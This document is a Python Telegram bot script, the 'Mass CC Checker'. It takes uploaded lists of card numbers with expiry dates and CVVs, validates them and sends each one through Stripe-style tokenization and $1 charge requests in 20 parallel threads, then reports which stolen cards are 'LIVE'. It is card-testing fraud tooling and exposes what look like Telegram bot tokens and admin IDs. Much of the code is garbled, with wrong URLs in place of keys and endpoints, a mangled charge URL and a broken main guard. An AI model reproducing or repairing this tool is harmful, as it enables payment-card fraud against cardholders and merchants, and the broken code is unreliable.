#!/usr/bin/env python3
# ============================================================
# MASS CC CHECKER TELEGRAM BOT — SINGLE FILE
# ============================================================

import telebot
from telebot import types
import requests
import time
import re
import os
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# CONFIG — EDIT THESE
# ============================================================

BOT_TOKEN = "8017205070:AAFgbCv6bPfLb-CWCelBW2_S50NYDOIAh2Q"  # @BotFather se lo
STRIPE_SECRET = "https://api.hcaptcha.com/checksiteconfig?v=40655446f87c28f63a7a2734a7d0c025500e8f91&host=b.stripecdn.com&sitekey=5034f7f0-a742-48aa-89e2-062ece60f0d6&sc=1&swa=1&spst=1"  # Stripe secret key
ADMIN_IDS = [7774294727]  # Apna Telegram ID

# ============================================================
# LUHN CHECK
# ============================================================

def luhn_check(card):
    card = card.replace(" ", "").replace("-", "")
    if not card.isdigit():
        return False
    digits = [int(d) for d in card]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    return sum(digits) % 10 == 0

# ============================================================
# BIN LOOKUP
# ============================================================

def get_bin_info(bin_num):
    try:
        url = f"hinlist.net/{bin_num}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown")
            }
    except:
        pass
    return None

# ============================================================
# STRIPE CARD CHECK
# ============================================================

def check_card(card, month, year, cvv):
    try:
        token_url = "https://api.dnschecker.org/ajax_files/gen_csrf.php?upd=1400.2377966285485"
        headers = {
            "Authorization": f"Bearer {STRIPE_SECRET}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "card[number]": card,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "card[cvc]": cvv
        }
        
        token_res = requests.post(token_url, data=data, headers=headers, timeout=10)
        if token_res.status_code != 200:
            return "DEAD", "Token failed"
        
        token = token_res.json().get("id")
        if not token:
            return "DEAD", "No token"
        
        charge_url = "hthttps://b.stripecdn.com/stripethirdparty-srv/assets/v32.18/GoogleTagManager.html?id=5964ab19-5d8c-43d8-a3d3-d150cf2c4112&origin=https%3A%2F%2Fdocs.stripe.comtps://api.stripe.com/v1/payment_intents"
        charge_data = {
            "amount": 100,
            "currency": "usd",
            "payment_method_data[type]": "card",
            "payment_method_data[card][token]": token,
            "confirm": "true"
        }
        
        charge_res = requests.post(charge_url, data=charge_data, headers=headers, timeout=10)
        
        if charge_res.status_code == 200:
            status = charge_res.json().get("status", "unknown")
            if status in ["succeeded", "requires_capture"]:
                return "LIVE", "✅ Charged"
            else:
                return "UNKNOWN", f"Status: {status}"
        
        error_text = charge_res.text.lower()
        if "insufficient_funds" in error_text:
            return "LIVE", "💰 Insufficient (Live)"
        elif "incorrect_cvc" in error_text:
            return "LIVE", "⚠️ Incorrect CVV (Live)"
        elif "declined" in error_text:
            return "DEAD", "❌ Declined"
        elif "card_error" in error_text:
            return "DEAD", "❌ Card error"
        else:
            return "DEAD", f"❌ {charge_res.status_code}"
            
    except Exception as e:
        return "ERROR", f"❌ {str(e)[:40]}"

# ============================================================
# MASS CHECK
# ============================================================
def mass_check(cards_list, max_workers=20):
    results = []
    total = len(cards_list)
    live = 0
    dead = 0
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        for card_data in cards_list:
            card, month, year, cvv = card_data
            future = executor.submit(check_card, card, month, year, cvv)
            futures[future] = (card, month, year, cvv)
        
        for i, future in enumerate(as_completed(futures)):
            card, month, year, cvv = futures[future]
            status, msg = future.result()
            
            result = f"{card[:4]}****{card[-4:]}|{month}|{year}|{status}"
            results.append(result)
            
            if status == "LIVE":
                live += 1
            else:
                dead += 1
    
    return results, total, live, dead

# ============================================================
# TELEGRAM BOT
# ============================================================

bot = telebot.TeleBot(BOT_TOKEN)

# ===== START =====
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Unauthorized!")
        return
    
    welcome = """
🔥 <b>MASS CC CHECKER BOT</b>

Send .txt file with cards:
<code>card|month|year|cvv</code>

Example:
<code>4111111111111111|12|2026|123</code>

📌 Commands:
/start — Show this
/help — Help
/status — Bot status
/bin 123456 — BIN lookup

⚡ Speed: 20 cards/second
💰 Stripe LIVE/DEAD check
"""
    bot.reply_to(message, welcome, parse_mode='HTML')

# ===== HELP =====
@bot.message_handler(commands=['help'])
def help_cmd(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Unauthorized!")
        return
    
    help_text = """
📖 <b>How to use:</b>

1. Create .txt file with cards:
<code>card|month|year|cvv</code>

2. Send file to bot
3. Wait for results

<b>Features:</b>
✅ Luhn validation
✅ BIN lookup
✅ Stripe LIVE/DEAD check
✅ Mass check (unlimited)
✅ Results file
"""
    bot.reply_to(message, help_text, parse_mode='HTML')

# ===== STATUS =====
@bot.message_handler(commands=['status'])
def status_cmd(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Unauthorized!")
        return
    
    status_text = """
🟢 <b>Bot Status</b>
Online: ✅
Stripe: Connected
Threads: 20
Speed: 20/sec
"""
    bot.reply_to(message, status_text, parse_mode='HTML')

# ===== BIN =====
@bot.message_handler(commands=['bin'])
def bin_cmd(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Unauthorized!")
        return
    
    bin_num = message.text.replace("/bin", "").strip()
    if len(bin_num) < 6:
        bot.reply_to(message, "❌ Enter 6 digits!")
        return
    
    info = get_bin_info(bin_num[:6])
    if info:
        response = f"""
🔍 <b>BIN LOOKUP</b>

🔢 BIN: {bin_num}
🏦 Bank: {info['bank']}
🌍 Country: {info['country']}
💳 Brand: {info['brand']}
📋 Type: {info['type']}
"""
    else:
        response = "❌ BIN not found!"
    
    bot.reply_to(message, response, parse_mode='HTML')

# ===== FILE HANDLER =====
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Unauthorized!")
        return
    
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Send .txt file only!")
        return
    
    status_msg = bot.reply_to(message, "⏳ Processing...")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8', errors='ignore')
        lines = content.strip().split('\n')
        
        cards = []
        for line in lines:
            parts = line.strip().split("|")
            if len(parts) >= 4:
                card = parts[0].strip()
                month = parts[1].strip()
                year = parts[2].strip()
                cvv = parts[3].strip()
                
                if luhn_check(card):
                    cards.append((card, month, year, cvv))
        
        if not cards:
            bot.edit_message_text("❌ No valid cards!", 
                                  chat_id=message.chat.id, 
                                  message_id=status_msg.message_id)
            return
        
        total = len(cards)
        bot.edit_message_text(f"📤 Found {total} cards. Checking...", 
                              chat_id=message.chat.id, 
                              message_id=status_msg.message_id)
        
        results, checked, live, dead = mass_check(cards)
        
        filename = f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("MASS CC CHECKER RESULTS\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total: {checked}\n")
            f.write(f"✅ LIVE: {live}\n")
            f.write(f"❌ DEAD: {dead}\n")
            f.write("=" * 60 + "\n\n")
            
            f.write("✅ LIVE CARDS:\n")
            f.write("-" * 40 + "\n")
            for r in results:
                if "LIVE" in r:
                    f.write(r + "\n")
            
            f.write("\n❌ DEAD CARDS:\n")
            f.write("-" * 40 + "\n")
            for r in results:
                if "LIVE" not in r:
                    f.write(r + "\n")
        
        with open(filename, 'rb') as f:
            bot.send_document(
                message.chat.id,
                f,
                caption=f"""
✅ <b>Mass Check Complete</b>

📊 Total: {checked}
✅ LIVE: {live}
❌ DEAD: {dead}
⏱️ Speed: 20 cards/sec
""",
                parse_mode='HTML'
            )
        
        os.remove(filename)
        bot.delete_message(message.chat.id, status_msg.message_id)
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", 
                              chat_id=message.chat.id, 
                              message_id=status_msg.message_id)

# ============================================================
# MAIN
# ============================================================

if name == "main":
    print("=" * 50)
    print("🔥 MASS CC CHECKER BOT")
    print("=" * 50)
    print(f"🤖 Bot: {8608722048:AAGKvKuLaOJim_2WgX5_yqa8xKWNnljGlbA[:10]}...")
    print(f"👥 Admins: {7774294727}")
    print("=" * 50)
    print("✅ Bot is running!")
    print("=" * 50)
    
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("\n👋 Bot stopped.")
        sys.exit(0)